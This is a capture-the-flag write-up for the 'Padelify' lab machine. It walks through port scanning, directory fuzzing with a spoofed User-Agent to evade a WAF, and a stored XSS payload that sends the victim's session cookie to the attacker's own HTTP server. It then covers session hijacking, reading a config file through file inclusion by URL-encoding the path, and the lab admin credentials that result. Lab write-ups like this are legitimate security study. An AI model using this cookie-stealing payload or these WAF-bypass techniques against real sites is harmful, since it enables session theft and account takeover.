# Padelify.thm

# Enumeration

```jsx
$ nmap -T5 -sC -sV -Pn 10.66.163.189              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 13:07 EST
Nmap scan report for 10.66.163.189                                                                    
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:11:69:24:a8:fc:fa:1a:dd:8e:93:c3:46:64:0e:b1 (ECDSA)
|_  256 c2:f8:99:31:2b:06:ba:86:aa:c8:4d:fb:96:58:84:81 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)

```

# Web

![Screenshot From 2025-12-19 13-06-11.png](Padelify%20thm/Screenshot_From_2025-12-19_13-06-11.png)

### Credentials:

```jsx
test:test
```

### Content Discovery / Web enumeration

![Screenshot From 2025-12-19 13-13-57.png](Padelify%20thm/Screenshot_From_2025-12-19_13-13-57.png)

Doesn’t show anything. Probably waf detected us form the User-agent.

Lets try it with changed user agent:

```jsx
$ ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://10.66.163.1
89/FUZZ -e .php -fs 2872 -H "User-Agent: Mozilla/5.0" -H "Cookie: PHPSESSID=lme0mgmrpa202k408tohk8i4ma" 

footer.php              [Status: 200, Size: 33, Words: 3, Lines: 1, Duration: 159ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 145ms]
live.php                [Status: 200, Size: 2056, Words: 200, Lines: 47, Duration: 238ms]
status.php              [Status: 200, Size: 4086, Words: 793, Lines: 151, Duration: 141ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 144ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 143ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 264ms]
config                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 143ms]
logs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 144ms]
dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 139ms]

```

### `logs` looks interesting:

 

![Screenshot From 2025-12-19 13-21-53.png](Padelify%20thm/Screenshot_From_2025-12-19_13-21-53.png)

We see that config/app.conf has the admin info.

There is XSS injection .

![Screenshot From 2025-12-19 14-23-16.png](Padelify%20thm/Screenshot_From_2025-12-19_14-23-16.png)

Firstly we open a python3 server:

```jsx
$ python3 -m http.server 9001                                                                                               
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

```jsx
`We run this scirpt:`
<script>var i=new Image();i.src=”[http://192.168.152.201:9001/?c=”](http://192.168.152.201:9001/?c=%E2%80%9D)+document[”coo”+”kie”] </script>
```

```jsx
`And we get the cookie:`

$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.66.163.189 - - [19/Dec/2025 14:19:23] "GET /?c=PHPSESSID=nn4sb5v6dekokf0njq301vnjas HTTP/1.1" 200 -
```

## We get into the moderator web account with this cookie:

![Screenshot From 2025-12-19 14-26-38.png](Padelify%20thm/Screenshot_From_2025-12-19_14-26-38.png)

### Trying SSRF:

![Screenshot From 2025-12-19 14-34-12.png](Padelify%20thm/Screenshot_From_2025-12-19_14-34-12.png)

### There is a file inclusion I can read some files like /logs/error.log:

![Screenshot From 2025-12-19 15-19-32.png](Padelify%20thm/Screenshot_From_2025-12-19_15-19-32.png)

### But others like /config/app.conf are blocked by the WAF. This can be by passed with url encoding.

```jsx
/config/app.conf ->  %2Fconfig%2Fapp%2Econf
```

![Screenshot From 2025-12-19 14-58-32.png](Padelify%20thm/Screenshot_From_2025-12-19_14-58-32.png)

```jsx
Admin cred: admin:bL}8,S9W1o44
```

![Screenshot From 2025-12-19 15-01-57.png](Padelify%20thm/Screenshot_From_2025-12-19_15-01-57.png)